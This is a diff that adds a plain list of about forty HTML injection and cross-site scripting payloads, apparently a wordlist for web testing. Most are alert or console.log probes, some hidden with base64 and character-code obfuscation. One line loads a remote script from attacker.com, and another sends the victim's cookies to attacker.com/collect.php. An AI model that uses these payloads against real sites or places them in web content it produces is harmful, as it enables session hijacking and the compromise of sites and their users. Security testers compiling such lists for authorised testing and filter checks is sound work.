@@ -1,0 +1,43 @@
+<img src="x" onerror="alert('HTML Injection')">
+<iframe src="javascript:alert('HTML Injection')"></iframe>
+<img src="#" onclick="alert('HTML Injection')">
+<input type="text" value="<script>alert('HTML Injection')</script>">
+<a href="javascript:alert('HTML Injection')">Click Me</a>
+<img src="x" onerror="javascript:alert('HTML Injection')">
+<script>document.write('HTML Injection')</script>
+<img src="x" onerror="console.log('HTML Injection')">
+<svg><script>alert('HTML Injection')</script></svg>
+<body/onload=alert('HTML Injection')>
+<img src="x" onerror="prompt('HTML Injection')">
+<a href="javascript:prompt('HTML Injection')">Click Me</a>
+<img src=x:alert('HTML Injection')">
+<script>prompt('HTML Injection')</script>
+<img src='x' onerror='alert(1)//'>
+<img src=x onerror=alert(1)>
+<img src=javascript:alert('HTML Injection')>
+<script>confirm('HTML Injection')</script>
+<img src="x" onerror="confirm('HTML Injection')">
+<iframe src="data:text/html,<script>alert('HTML Injection')</script>"></iframe>
+<object data="javascript:alert('HTML Injection')"></object>
+<body/onload=confirm('HTML Injection')>
+<img src="x" onerror="confirm('HTML Injection')">
+<a href="javascript:confirm('HTML Injection')">Click Me</a>
+<img src=x:confirm('HTML Injection')">
+<script>console.log('HTML Injection')</script>
+<img src="x" onerror="console.log('HTML Injection')">
+<a href="javascript:console.log('HTML Injection')">Click Me</a>
+<img src=x:console.log('HTML Injection')">
+<img src=x onerror=console.log(1)>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img src="x" onerror="eval(atob('YWxlcnQoJ0hUVFAvMS4wJyk='))">
+<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+<img src="x" onerror="window['alert']('HTML Injection')">
+<img src="x" onerror="window['eval'](atob('YWxlcnQoJ0hUVFAvMS4wJyk='))">
+<img src="x" onerror="window['eval'](String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+<script src="https://attacker.com/malicious.js"></script>
+<img src=x onerror="document.body.innerHTML='<h1>HTML Injection</h1>'">
+<img src=x:alert(alt) onerror=eval(src) alt="HTML Injection" src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoYXJndW1lbnRzKTwvc3ZnPgo=">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRUUCcpPC9zY3JpcHQ+">Click Me</a>
+<img src=x:x onerror=window['location']['href']="https://attacker.com/collect.php?cookie="+document['cookie']>
+<script>setTimeout(function(){alert('HTML Injection')},5000)</script>
+<img src="x" onerror="setTimeout(function(){alert('HTML Injection')},5000)">
